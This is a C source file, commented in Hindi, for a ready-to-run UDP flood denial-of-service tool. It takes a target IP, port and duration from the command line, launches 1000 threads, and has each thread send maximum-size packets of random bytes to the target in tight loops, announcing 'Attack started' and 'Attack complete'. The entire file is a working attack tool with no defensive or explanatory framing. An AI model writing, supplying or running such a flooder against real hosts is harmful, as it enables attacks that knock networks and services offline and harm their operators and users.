#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

#define DEFAULT_THREADS 1000  // डिफॉल्ट थ्रेड्स
#define FLOOD_RATE 10000      // प्रति सेकंड पैकेट्स (हाई रेट)

// थ्रेड डेटा स्ट्रक्चर
struct thread_data {
    char *ip;
    int port;
    int time;
};

// रैंडम पेलोड जनरेशन
void generate_payload(char *buffer, size_t length) {
    for (size_t i = 0; i < length; i++) {
        buffer[i] = rand() % 256; // 0-255 तक रैंडम बाइट्स
    }
}

// अटैक थ्रेड
void *attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    char packet[65507]; // UDP का मैक्सिमम पेलोड साइज (64KB)

    // सॉकेट बनाएं
    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    time_t end = time(NULL) + data->time; // यूजर द्वारा दिया गया समय

    while (time(NULL) <= end) {
        // रैंडम पेलोड भरें
        generate_payload(packet, sizeof(packet));

        // हाई स्पीड में पैकेट भेजें
        for (int i = 0; i < FLOOD_RATE; i++) {
            sendto(sock, packet, sizeof(packet), 0, 
                  (struct sockaddr *)&server_addr, sizeof(server_addr));
        }
    }

    close(sock);
    pthread_exit(NULL);
}

// यूसेज प्रिंट करने के लिए फंक्शन
void usage(char *program_name) {
    printf("Usage: %s <target-ip> <port> <time-in-seconds>\n", program_name);
    exit(1);
}

// मुख्य फंक्शन
int main(int argc, char *argv[]) {
    if (argc != 4) {
        usage(argv[0]); // यूसेज प्रिंट करें
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);

    pthread_t *thread_ids = malloc(DEFAULT_THREADS * sizeof(pthread_t));
    struct thread_data data = {ip, port, time};

    printf("Attack started on %s:%d for %d seconds with %d threads\n", ip, port, time, DEFAULT_THREADS);

    // थ्रेड्स शुरू करें
    for (int i = 0; i < DEFAULT_THREADS; i++) {
        pthread_create(&thread_ids[i], NULL, attack, &data);
    }

    // थ्रेड्स का इंतज़ार करें
    for (int i = 0; i < DEFAULT_THREADS; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    free(thread_ids);
    printf("\nAttack complete!\n");
    return 0;
}
